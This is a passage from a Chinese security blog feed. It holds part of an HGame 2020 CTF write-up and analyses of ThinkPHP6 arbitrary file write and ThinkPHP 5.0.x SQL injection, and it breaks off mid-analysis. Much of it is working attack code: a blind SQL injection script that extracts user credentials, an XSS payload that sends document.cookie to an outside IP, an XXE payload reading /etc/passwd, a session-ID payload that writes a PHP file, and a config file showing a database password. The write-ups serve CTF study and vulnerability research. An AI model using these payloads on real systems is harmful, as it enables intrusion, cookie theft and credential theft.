&quot;amount&quot;: num}        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text        if &quot;success&quot; in result:            print(&quot;successfully solve %d items&quot; % num)if __name__==&#39;__main__&#39;:    i=0    while True:        p = Pool(100)        num=500        for i in range(100):            p.apply_async(buy, args=(num,))        print(&#39;Waiting for all buy subprocesses done...&#39;)        p.close()        p.join()        print(&#39;All subprocesses done.&#39;)        p = Pool(100)        for i in range(100):            p.apply_async(solve, args=(num,))        print(&#39;Waiting for all solve subprocesses done...&#39;)        p.close()        p.join()        print(&#39;All subprocesses done.&#39;)</code></pre><h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><p>注册登陆的黑名单</p><pre><code class="python">allow: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;_&#39;, &#39;\n&#39;]disable: [&#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;, &#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\x0b&#39;, &#39;\x0c&#39;]</code></pre><p>一个个检测输入点发现,delete方法存在sql注入</p><p>注入脚本</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupdef send():    burp0_url = &quot;http://139.199.182.61:19999/index.php?method=send&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    burp0_data = {&quot;message&quot;: &quot;aaa&quot;}    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)    if res.status_code==200:        return 1    else :        return 0def get_id():    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)    html = res.text    try :        soup = BeautifulSoup(html,&#39;html.parser&#39;) #把网页解析为BeautifulSoup对象        url=soup.find(&quot;span&quot;,class_=&quot;message&quot;).find(&quot;a&quot;)[&#39;href&#39;]    except:        return False    return url.replace(&quot;index.php?method=delete&amp;delete_id=&quot;,&quot;&quot;)def check(mesid):    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)    url=&quot;index.php?method=delete&amp;delete_id=&quot;+str(mesid)    if url in res.text:        return True    return False#index.php?method=delete&amp;delete_id=6594def delete(mesid):    burp0_url = &quot;http://139.199.182.61:19999/index.php&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    requests.get(burp0_url, params={&quot;method&quot;:&quot;delete&quot;,&quot;delete_id&quot;:mesid},headers=burp0_headers, cookies=burp0_cookies)def sql_inj(sql):    mesid=get_id()    delete(str(mesid)+&quot; and (&quot;+sql+&quot;) #&quot;)    if not check(mesid):        print(&quot;%s success&quot; % sql)        send()        return True    print(&quot;%s fail&quot; % sql)    return False# sql_inj(&quot;(select substr(hex(&#39;1&#39;),1,1))=&#39;3&#39;&quot;)cha=&quot;0123456789ABCDEF&quot;result=&quot;&quot;p=0while True:    p+=1    temp=&#39;&#39;    for i in cha:        if sql_inj(&quot;(select substr(hex(group_concat(name,&#39;,&#39;,password)),%d,1) FROM user where id=1)=&#39;%s&#39;&quot; % (p,i) ):            result+=i            temp=i            print(result)            break    if temp!=result[-1]:        break#information_schema,babysql#messages,user#id,name,password</code></pre><h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>操操操,这题对我有毒,我这里不显示csp,导致我卡了很久</p><p>存在csp:</p><pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></pre><p>先检测一下</p><p> <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p><p><img src="https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png" alt="image19319"></p><p>说object-src不安全</p><p>这个策略已经ban掉了内联脚本,所以我们直接传一个js代码过去没用</p><p>我们对send方法进行检测发现,会过滤script,但是用双写就可以绕过,还会把大写转成小写</p><p>用burp代理,查看发送的请求,我们可以会注意到<code>/send</code>会直接返回我们发送的内容,利用这个恰好可以绕过<code>script-src &#39;self&#39;</code> ,</p><p>我们发送以下payload(用script标签也一样)</p><pre><code>&lt;iframe src=&quot;send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e&quot;&gt;&lt;/iframe&gt;</code></pre><p>成功弹窗,但是我们还有<code>default-src &#39;self&#39;</code>阻碍着我们带回数据</p><p>因为没有设置<code>object-src</code>我们可以用<code>embed</code>标签带回数据</p><p>最后的payload</p><pre><code>&lt;iframe src=&quot;send?message=&lt;body&gt;&lt;scscrscriptiptript&gt;var+iframe+%3d+eval(%22document.create\105lement(&#39;embed&#39;)%22)%3biframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3beval(%22document.body.append\103hild(iframe)%22)%3b&lt;/scrscrscriptiptipt&gt;&lt;/body&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p><code>hgame{1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.}</code></p><h3 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h3><p>一看就知道有xxe漏洞</p><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;http://127.0.0.1/dtd.xml&quot;&gt;%sp;%param1;]&gt;&lt;r&gt;&amp;exfil;&lt;/r&gt;File stored on http://127.0.0.1/dtd.xml&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://127.0.0.1/dtd.xml?%data;&#39;&gt;&quot;&gt;</code></pre><p>submit.php</p><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try{    $stmt = $conn-&gt;prepare(&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;);    $stmt-&gt;bindParam(&#39;:id&#39;, $id);    $stmt-&gt;bindParam(&#39;:chal_name&#39;, $chal_name);    $stmt-&gt;bindParam(&#39;:bd_level&#39;, $level);    $stmt-&gt;bindParam(&#39;:bd_time&#39;, $level);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $id = $creds-&gt;id;    $chal_name = $creds-&gt;name;    $level = $creds-&gt;level;    $time = $creds-&gt;time;    if ($id == &quot;&quot; || $level == &quot;&quot; || $chal_name == &quot;&quot;|| $time == &quot;&quot;) {        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;请填写信息！&quot;);        die($result);    }    $stmt-&gt;execute();    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,&quot;已提交成功，正在为您安排打手&quot;);}catch(Exception $e){    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;提交失败！&quot;);}header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p>config.php</p><pre><code class="php">&lt;?php$dbms=&#39;mysql&#39;;$host=&#39;localhost&#39;;$dbName=&#39;bdctr_message&#39;;$user=&#39;root&#39;;$pass=&#39;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&#39;;$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);?&gt;</code></pre><p>原本想着用gopher执行sql语句,但是有密码无法执行</p><p>PDO配置错误?</p><p>宽字节注入?(x)</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><p> <a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a> </p><h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>就说说咋拿到密码的</p><p>压缩文件提示<code>End of Zip archive, comment: &quot;Password is picture ID.&quot;</code></p><p>利用搜索引擎(<code>Pixiv@純白可憐</code>)拿到密码</p><h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>解压得到一个文本和一个压缩包</p><p>观察文本和压缩包发现,二者的CRC值相同,于是考虑用明文攻击(不好意思,我是看着wiki遍历过去的)</p><p>然后拿到里面的word文档,但是是加密的,猝.</p><p>在看一下那个文本,有点像培根密码</p><pre><code class="python">s=&quot;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&quot;.replace(&quot; &quot;,&quot;&quot;)[:-1]result=&quot;&quot;for i in range(0,len(s),5):    temp=&quot;&quot;    for j in range(5):        if s[i+j]==s[i+j].lower():            temp+=&quot;0&quot;        else :            temp+=&quot;1&quot;    result+=chr(int(temp,2)+ord(&#39;A&#39;))print(result)</code></pre><p>于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag</p><h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p>解压得到password.txt和ok.zip</p><p>根据password.txt的提示,栅栏解密+凯撒密码得到压缩包密码.</p><p>拿到一堆ook直接上谷歌.ok了</p><p>base32-&gt;base64-&gt;二维码</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>直接套脚本</p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><pre><code class="python">#!/usr/bin/env python3# -*- coding: utf-8 -*-import gmpy2from secret import A, B, flagassert flag.startswith(&#39;hgame{&#39;) and flag.endswith(&#39;}&#39;)TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;MOD = len(TABLE)cipher = &#39;&#39;for b in flag:    i = TABLE.find(b)    if i == -1:        cipher += b    else:        ii = (A*i + B) % MOD        cipher += TABLE[ii]print(cipher)# A8I5z{xr1A_J7ha_vG_TpH410}</code></pre><p>我们观察可以发现这其实是个单表替换加密</p><p>那么我们只要生成生成一个加密表就可以很容易的求出加密内容</p><p>但是唯一麻烦的是我们不知道A,B,但是我们知道明文的前几个字符hgame</p><p>于是有</p><pre><code class="python">TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;MOD = len(TABLE)cipher=&quot;A8I5z{xr1A_J7ha_vG_TpH410}&quot;for A in range(1,MOD):    for B in range(1,MOD):        result=&quot;&quot;        try :            #生成加密表            TABLE2={}            for b in TABLE:                i=TABLE.find(b)                TABLE2[TABLE[(A*i + B) % MOD]]=b            #解密            for b in cipher:                ii=TABLE.find(b)                if ii==-1:                    result+=b                else :                    result+=TABLE2[b]        except :            pass        if &quot;hgame&quot; in result:            print(result)</code></pre><h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>这个是位置移动加密,输入一个和flag长度相同的字符串就知道如何解密了</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>覆盖变量值来执行后门函数</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/07/2020hgame/">https://explorersss.github.io/2020/02/07/2020hgame/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP6 任意文件操作漏洞分析</title>
      <link href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li>ThinkPHP6.0.0-6.0.1</li><li>开启Sessoin中间件</li></ol><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p><p>复现环境为:phpstudy+thinkphp6.0.1</p><p><code>\app\controller\index.php</code>:</p><pre><code class="php">&lt;?phpnamespace app\controller;use app\BaseController;use think\facade\Session;class Index extends BaseController{    public function index($name)    {        Session::set(&#39;name&#39;, $name);        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;    }}</code></pre><p><code>\app\middleware.php</code></p><pre><code class="php">&lt;?php// 全局中间件定义文件return [    // 全局请求缓存    // \think\middleware\CheckRequestCache::class,    // 多语言加载    // \think\middleware\LoadLangPack::class,//     Session初始化     \think\middleware\SessionInit::class];</code></pre><p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p><pre><code class="php">public function save(): void    {        $this-&gt;clearFlashData();//清除原来的数据        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p><pre><code class="php">public function write(string $sessID, string $sessData): bool    {        $filename = $this-&gt;getFileName($sessID, true);        $data     = $sessData;        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {            //数据压缩            $data = gzcompress($data, 3);        }        return $this-&gt;writeFile($filename, $data);    }</code></pre><p>再跟进<code>$this-&gt;writeFile</code></p><pre><code class="php">protected function writeFile($path, $content): bool    {        return (bool) file_put_contents($path, $content, LOCK_EX);    }</code></pre><p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p><p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p><p>跟进去</p><pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string    {        if ($this-&gt;config[&#39;prefix&#39;]) {            // 使用子目录            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;        } else {            $name = &#39;sess_&#39; . $name;        }        $filename = $this-&gt;config[&#39;path&#39;] . $name;        $dir      = dirname($filename);        if ($auto &amp;&amp; !is_dir($dir)) {            try {                mkdir($dir, 0755, true);            } catch (\Exception $e) {                // 创建失败            }        }        return $filename;    }</code></pre><p><code>$filename</code>直接由末端拼接参数<code>$name</code></p><p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p><pre><code class="php">    public function getId(): string    {        return $this-&gt;id;    }</code></pre><p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p><pre><code class="php">    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32</code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p><p>查找调用setId的函数</p><p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p><p>其中<code>SessionInit</code></p><pre><code class="php">    public function handle($request, Closure $next)    {        // Session初始化        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);        $cookieName   = $this-&gt;session-&gt;getName();        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {            $sessionId = $request-&gt;request($varSessionId);        } else {            $sessionId = $request-&gt;cookie($cookieName);        }        if ($sessionId) {            $this-&gt;session-&gt;setId($sessionId);        }    }</code></pre><p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p><p>因此构造payload</p><pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3ECookie :PHPSESSID=9f7777c08f3909751b148338ba08.php访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><pre><code class="php">public function setId($id=null):void{    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());}</code></pre><p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/02/01/ThinkPHP6">https://explorersss.github.io/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/](<a href="https://explorersss.github.io/2020/02/01/ThinkPHP6">https://explorersss.github.io/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP框架5.0.x_SQL注入分析</title>
      <link href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
      <url>/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露"><a href="#ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露" class="headerlink" title="ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露"></a>ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露</h1><h2 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h2><p>开启debug模式的thinkphp5.0.x</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从官网上下载5.0.9完整版</p><p><code>application/index/controller/index.php</code>内容如下</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use app\model\Gather;class Index{    public function index()    {        $ids = input(&#39;ids/a&#39;);        $t = db(&quot;user&quot;);        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    }}</code></pre><p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们在漏洞的关键位置下个断点进行分析,<code>thinkphp\library\think\db\Builder.php</code>:383行</p><p>调用堆栈为:</p><p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p><p>从index()方法开始</p><pre><code class="php">public function index()    {        $ids = input(&#39;ids/a&#39;);        $t = db(&quot;user&quot;);        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    }</code></pre><p>调用<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>返回值的select()方法</p><p>我们先看下select()方法,它会将<code>$option</code>作为参数调用<code>Builder::select</code>方法</p><pre><code class="php">public function select($data = null)    {        ...        // 分析查询表达式        $options = $this-&gt;parseExpress();        ...        if (!$resultSet) {            // 生成查询SQL            $sql = $this-&gt;builder-&gt;select($options);            // 获取参数绑定            ...            }            ...    }</code></pre><p>我们跟进<code>$this-&gt;parseExpress();</code>看<code>$option</code>是如何生成的</p><pre><code class="php">protected function parseExpress()    {        $options = $this-&gt;options;        ...    }</code></pre><p>这里是直接令<code>$options = $this-&gt;options;</code>,而<code>$this-&gt;options</code>是<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>过程生成的</p><p>跟进去发现有这一条语句 <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,其中<code>$where</code>由<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>得到</p><p>获得<code>$option</code>的调用链为:</p><p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null)</code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p><p>我们回到<code>$this-&gt;builder-&gt;select($options);</code>,现在我们知道<code>$this-&gt;options[&#39;where&#39;][$logic]</code>是我们的可控位置</p><p>跟进去</p><pre><code class="php">public function select($options = [])    {        $sql = str_replace(            [&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;],            [                $this-&gt;parseTable($options[&#39;table&#39;], $options),                $this-&gt;parseDistinct($options[&#39;distinct&#39;]),                $this-&gt;parseField($options[&#39;field&#39;], $options),                $this-&gt;parseJoin($options[&#39;join&#39;], $options),                $this-&gt;parseWhere($options[&#39;where&#39;], $options),                $this-&gt;parseGroup($options[&#39;group&#39;]),                $this-&gt;parseHaving($options[&#39;having&#39;]),                $this-&gt;parseOrder($options[&#39;order&#39;], $options),                $this-&gt;parseLimit($options[&#39;limit&#39;]),                $this-&gt;parseUnion($options[&#39;union&#39;]),                $this-&gt;parseLock($options[&#39;lock&#39;]),                $this-&gt;parseComment($options[&#39;comment&#39;]),                $this-&gt;parseForce($options[&#39;force&#39;]),            ], $this-&gt;selectSql);        return $sql;    }</code></pre><p>这个<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>分支进入了关键的漏洞位置,此时<code>$where</code>可控</p><pre><code class="php">protected function parseWhere($where, $options)    {        $whereStr = $this-&gt;buildWhere($where, $options);        ...        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;    }</code></pre><p>再跟进<code>$this-&gt;buildWhere($where, $options)</code>,此时<code>$where</code>可控</p><pre><code class="php">public function 